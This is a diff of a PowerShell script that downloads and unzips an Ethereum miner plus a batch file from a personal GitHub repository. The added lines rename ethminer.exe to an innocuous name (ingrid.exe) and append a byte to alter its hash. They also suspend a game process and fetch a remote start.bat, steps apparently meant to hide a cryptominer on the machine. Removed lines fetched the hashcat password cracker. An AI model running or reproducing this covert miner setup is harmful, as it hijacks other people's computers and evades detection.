@@ -3,9 +3,9 @@
 $wc = New-Object System.Net.WebClient
 
 # URLs
+$start = "https://github.com/Slurpgeit/temp/raw/master/start.bat"
 $SysInternals = "https://download.sysinternals.com/files/SysinternalsSuite.zip"
-$hashcat = "https://github.com/Slurpgeit/temp/raw/master/hashcat-5.1.0.zip"
-$eth = "https://github.com/ethereum-mining/ethminer/releases/download/v0.17.1/ethminer-0.17.1-cuda10.0-windows-amd64.zip"
+$eth = "https://github.com/nanopool/genoil-ethereum/releases/download/v1.1.7/ethminer-0.9.41-genoil-1.1.7.zip"
 
 # Functions
 function Unzip($file, $destination) {
@@ -17,11 +17,15 @@ function Unzip($file, $destination) {
 }
 
 # Run
-$wc.DownloadFile($SysInternals,"c:\temp\sysinternals.zip")
-Unzip -File "c:\temp\sysinternals.zip" -Destination "c:\temp"
+#$wc.DownloadFile($SysInternals,"c:\temp\sysinternals.zip")
+#Unzip -File "c:\temp\sysinternals.zip" -Destination "c:\temp"
 
-$wc.DownloadFile($hashcat,"c:\temp\hashcat.zip")
-Unzip -File "c:\temp\hashcat.zip" -Destination "c:\temp"
+.\pssuspend.exe -accepteula tombraider.exe
 
 $wc.DownloadFile($eth,"c:\temp\eth.zip")
 Unzip -File "c:\temp\eth.zip" -Destination "c:\temp"
+
+move ethminer.exe ingrid.exe
+echo a >> ingrid.exe
+
+$wc.DownloadFile($start,"c:\temp\start.bat")
